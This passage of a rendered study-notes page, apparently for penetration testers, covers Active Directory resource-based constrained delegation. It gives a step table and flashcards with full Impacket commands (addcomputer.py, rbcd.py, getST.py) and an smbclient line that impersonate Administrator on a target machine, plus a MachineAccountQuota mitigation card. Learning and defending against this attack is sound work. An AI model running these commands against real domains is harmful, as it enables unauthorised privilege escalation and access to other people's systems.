+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1. Create controlled computer</td>
+<td><code>addcomputer.py -computer-name '&lt;name&gt;' -computer-pass '&lt;pw&gt;' -dc-host &lt;dc&gt; -domain-netbios &lt;NETBIOS&gt; &lt;domain&gt;/&lt;atk&gt;:'&lt;pw&gt;'</code></td>
+</tr>
+<tr>
+<td>2. Write RBCD attribute</td>
+<td><code>rbcd.py -delegate-from "&lt;name&gt;\$" -delegate-to "&lt;TARGET&gt;\$" -dc-ip &lt;dc&gt; -action write &lt;domain&gt;/&lt;atk&gt;:'&lt;pw&gt;'</code></td>
+</tr>
+<tr>
+<td>3. S4U2self + S4U2proxy</td>
+<td><code>getST.py -spn 'cifs/&lt;target&gt;.&lt;domain&gt;' -impersonate Administrator -dc-ip &lt;dc&gt; "&lt;domain&gt;/&lt;name&gt;\$:&lt;pw&gt;"</code></td>
+</tr>
+<tr>
+<td>4. Use the ticket</td>
+<td><code>export KRB5CCNAME=Administrator.ccache; smbclient //&lt;target&gt;/C$ -k -c "ls"</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: RBCD vs Classic Constrained Delegation</strong></p>
+<p>Q: Where is the trust list stored for classic constrained delegation vs RBCD?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Classic: <code>msDS-AllowedToDelegateTo</code> on the <strong>source</strong> account, listing target SPNs the source may delegate to. RBCD: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the <strong>target</strong> computer, listing source SIDs allowed to delegate to it. Classic is configured by Tier-0 (<code>SeEnableDelegationPrivilege</code>); RBCD is configured by anyone with WriteProperty on the target's attribute, which is a much more common ACL right.</p>
+</details>
+<p><strong>Card 2: addcomputer.py Syntax</strong></p>
+<p>Q: Write the command to create computer account <code>fake01</code> with password <code>Pwd#</code> against <code>corp.local</code> DC <code>dc01</code> as <code>j.smith / Pass#</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>addcomputer.py<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;fake01&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="w">  </span>-computer-pass<span class="w"> </span><span class="s1">&#39;Pwd#&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">  </span>-dc-host<span class="w"> </span>dc01<span class="w"> </span>-domain-netbios<span class="w"> </span>CORP<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="w">  </span>corp.local/j.smith:<span class="s1">&#39;Pass#&#39;</span>
+</code></pre></div>
+<p>The <code>$</code> suffix is added automatically. Default MAQ allows this for any user. Confirm with <code>netexec smb dc01 -u 'fake01$' -p 'Pwd#'</code>.</p>
+</details>
+<p><strong>Card 3: rbcd.py write</strong></p>
+<p>Q: Write the rbcd.py command to add <code>fake01$</code> to <code>WS01$</code>'s allowed list against <code>corp.local</code> DC <code>dc01</code> as <code>j.smith / Pass#</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>rbcd.py<span class="w"> </span>-delegate-from<span class="w"> </span><span class="s2">&quot;fake01\$&quot;</span><span class="w"> </span>-delegate-to<span class="w"> </span><span class="s2">&quot;WS01\$&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">  </span>-dc-ip<span class="w"> </span>dc01<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="w">  </span>corp.local/j.smith:<span class="s1">&#39;Pass#&#39;</span>
+</code></pre></div>
+<p>Replace <code>write</code> with <code>read</code> to query, <code>remove</code> to clean up. The <code>\$</code> escapes shell expansion of the <code>$</code>.</p>
+</details>
+<p><strong>Card 4: S4U from a Controlled Computer Account</strong></p>
+<p>Q: Write the getST.py command to obtain a TGS for <code>cifs/ws01.corp.local</code> impersonating Administrator using <code>fake01$ / Pwd#</code> as source.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/ws01.corp.local&#39;</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span><span class="s2">&quot;corp.local/fake01\$:Pwd#&quot;</span>
+</code></pre></div>
+<p>Output: <code>Administrator.ccache</code>. Use with <code>KRB5CCNAME=Administrator.ccache smbclient //ws01.corp.local/C$ -k</code>.</p>
+</details>
+<p><strong>Card 5: MAQ Mitigation</strong></p>
+<p>Q: One change to ms-DS-MachineAccountQuota that closes the easy RBCD source-account path; what breaks?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Set <code>ms-DS-MachineAccountQuota = 0</code> on the domain object. Self-service domain join breaks; users can no longer add their own workstation. The mitigation is to grant a dedicated provisioning account <code>Create Computer Objects</code> extended right on a specific OU and use that account for all domain joins via SCCM / MDT / Intune. Mature environments do this routinely; smaller environments accept the RBCD risk to keep self-service join working.</p>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mermaid-fix.js?v=4"></script>
+      
+        <script src="../../javascripts/pdf-export.js?v=2"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+      
+    
+  </body>
+</html>
